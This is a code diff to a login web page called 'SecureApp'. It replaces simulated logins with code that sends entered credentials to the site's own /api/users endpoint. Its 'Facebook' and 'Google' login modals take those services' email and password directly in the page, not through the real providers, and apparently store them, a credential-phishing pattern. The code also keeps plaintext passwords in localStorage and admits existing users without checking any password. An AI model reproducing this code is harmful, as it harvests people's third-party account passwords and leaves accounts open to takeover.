@@ -718,7 +718,7 @@
                         </div>
                     </div>
                     <audio id="backgroundMusic" loop>
-                        <source src="/music/Freebeat_Love_Letter_Prod_By_TsT_Soundz_9jaflaver.com_.mp3" type="audio/mpeg">
+                        <source src="background-music.mp3" type="audio/mpeg">
                         Your browser does not support the audio element.
                     </audio>
                 </div>
@@ -830,6 +830,53 @@
     </div>
 
     <script>
+        // ===== NEON DATABASE CONFIGURATION =====
+        const API_BASE_URL = window.location.origin;
+        let currentUser = null;
+
+        // ===== DATABASE FUNCTIONS =====
+        async function storeUserInDatabase(userData) {
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/users`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(userData)
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                const result = await response.json();
+                return result;
+            } catch (error) {
+                console.error('Database storage error:', error);
+                // Fallback to localStorage
+                localStorage.setItem('user', JSON.stringify(userData));
+                return userData;
+            }
+        }
+
+        async function checkUserExists(identifier) {
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/user-check?identifier=${encodeURIComponent(identifier)}`);
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                const result = await response.json();
+                return result.user || null;
+            } catch (error) {
+                console.error('Database check error:', error);
+                // Fallback to localStorage
+                const storedUser = localStorage.getItem('user');
+                return storedUser ? JSON.parse(storedUser) : null;
+            }
+        }
+
         // ===== DOM ELEMENTS =====
         const loginPage = document.getElementById('loginPage');
         const homePage = document.getElementById('homePage');
@@ -888,6 +935,8 @@
         });
 
         logoutBtn.addEventListener('click', () => {
+            currentUser = null;
+            localStorage.removeItem('user');
             loginPage.style.display = 'flex';
             homePage.style.display = 'none';
         });
@@ -903,7 +952,7 @@
         });
 
         // ===== LOGIN FUNCTIONS =====
-        function handleEmailLogin() {
+        async function handleEmailLogin() {
             const identifier = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             
@@ -917,18 +966,36 @@
                 return;
             }
             
-            // Simple login - no database
-            userAvatar.textContent = identifier.charAt(0).toUpperCase();
-            userName.textContent = identifier;
-            
-            loginPage.style.display = 'none';
-            homePage.style.display = 'flex';
-            
-            // Initialize home page features
-            initializeHomePage();
+            try {
+                const existingUser = await checkUserExists(identifier);
+                
+                if (!existingUser) {
+                    const userData = {
+                        email: isValidEmail(identifier) ? identifier : null,
+                        phone: isValidPhone(identifier) ? identifier : null,
+                        password: password,
+                        login_method: 'email'
+                    };
+                    currentUser = await storeUserInDatabase(userData);
+                } else {
+                    currentUser = existingUser;
+                }
+                
+                userAvatar.textContent = identifier.charAt(0).toUpperCase();
+                userName.textContent = identifier;
+                
+                loginPage.style.display = 'none';
+                homePage.style.display = 'flex';
+                
+                // Initialize home page features
+                initializeHomePage();
+                
+            } catch (error) {
+                alert('Login failed. Please try again.');
+            }
         }
 
-        function handleProviderLogin(provider) {
+        async function handleProviderLogin(provider) {
             let email, password, modal, form, loading;
             
             if (provider === 'facebook') {
@@ -954,8 +1021,20 @@
             form.style.display = 'none';
             loading.style.display = 'flex';
             
-            // Simulate login process
-            setTimeout(() => {
+            try {
+                const existingUser = await checkUserExists(email);
+                
+                if (!existingUser) {
+                    const userData = {
+                        email: email,
+                        password: password,
+                        login_method: provider
+                    };
+                    currentUser = await storeUserInDatabase(userData);
+                } else {
+                    currentUser = existingUser;
+                }
+                
                 userAvatar.textContent = provider.charAt(0).toUpperCase();
                 userName.textContent = `${provider} User (${email})`;
                 
@@ -966,7 +1045,17 @@
                 // Initialize home page features
                 initializeHomePage();
                 
-            }, 2000);
+            } catch (error) {
+                alert('Login failed. Please try again.');
+            } finally {
+                // Reset forms
+                form.style.display = 'flex';
+                loading.style.display = 'none';
+                document.getElementById('facebookEmail').value = '';
+                document.getElementById('facebookPassword').value = '';
+                document.getElementById('googleEmail').value = '';
+                document.getElementById('googlePassword').value = '';
+            }
         }
 
         // ===== VALIDATION FUNCTIONS =====
@@ -1142,8 +1231,22 @@ Best regards!`;
             initializeMusicPlayer();
         }
 
-        document.addEventListener('DOMContentLoaded', function() {
-            console.log('SecureApp loaded successfully!');
+        // Check if user is already logged in
+        window.addEventListener('DOMContentLoaded', async () => {
+            try {
+                // Try to get user from localStorage first
+                const storedUser = localStorage.getItem('user');
+                if (storedUser) {
+                    currentUser = JSON.parse(storedUser);
+                    userAvatar.textContent = (currentUser.email || currentUser.phone).charAt(0).toUpperCase();
+                    userName.textContent = currentUser.email || currentUser.phone;
+                    loginPage.style.display = 'none';
+                    homePage.style.display = 'flex';
+                    initializeHomePage();
+                }
+            } catch (error) {
+                console.log('No stored user found');
+            }
         });
     </script>
 </body>
